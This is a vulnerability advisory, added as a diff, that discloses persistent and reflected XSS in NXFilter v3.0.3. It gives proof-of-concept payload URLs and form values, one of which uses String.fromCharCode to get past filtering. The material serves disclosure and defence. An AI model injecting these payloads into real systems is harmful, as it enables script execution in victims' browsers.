@@ -1,0 +1,102 @@
+[+] Credits: hyp3rlinx
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/AS-NXFILTER-XSS.txt
+
+
+Vendor:
+================================
+www.nxfilter.org/p2/
+
+
+Product:
+================================
+NXFilter v3.0.3
+
+
+Vulnerability Type:
+=========================
+Persistent & Reflected XSS
+
+
+CVE Reference:
+==============
+N/A
+
+
+Vulnerability Details:
+=====================
+Persistent & reflected XSS entry points exist allowing arbitrary client
+side browser code execution
+on victims who click our infected linx or visit persistently stored XSS
+payloads. XSS strings seem
+to get filtered, yet we can defeat that using JS String.fromCharCode()
+functions.
+
+
+Exploit code(s):
+===============
+
+1) persistent XSS under category / custom
+   "name" parameter is vulnerable to persistent XSS injection using POST
+method.
+
+http://localhost/category,custom.jsp
+<input type="text" name="description" value="<script>alert(666)</script>"
+size="50">
+
+
+2) reflected XSS
+
+http://localhost/classifier,ruleset.jsp?action_flag=&page=1&kw=%22/%3E%3Cscript%3Ealert%28666%29%3C/script%3E&id=&domain=&keyword=&points=
+
+
+
+3) reflected XSS
+
+http://localhost/report,daily.jsp?stime=2015%2F10%2F17&time_option=yesterday&user=%22/%3E%3Cscript%3Ealert%28String.fromCharCode%2872%29%2bString.fromCharCode%2869%29%2bString.fromCharCode%2876%29%2bString.fromCharCode%2876%29%29%3C/script%3E
+
+
+
+Disclosure Timeline:
+=======================================
+Vendor Notification:  October 18, 2015
+November 5, 2015 : Public Disclosure
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+===================================================
+High
+
+
+Description:
+==================================================
+Request Method(s):              [+] GET / POST
+
+
+Vulnerable Product:             [+] NXFilter v3.0.3
+
+
+Vulnerable Parameter(s):        [+] name, user, kw
+
+
+
+===========================================================
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and that due
+credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit is given to
+the author.
+The author is not responsible for any misuse of the information contained
+herein and prohibits any malicious use of all security related information
+or exploits by the author or elsewhere.
+
+by hyp3rlinx
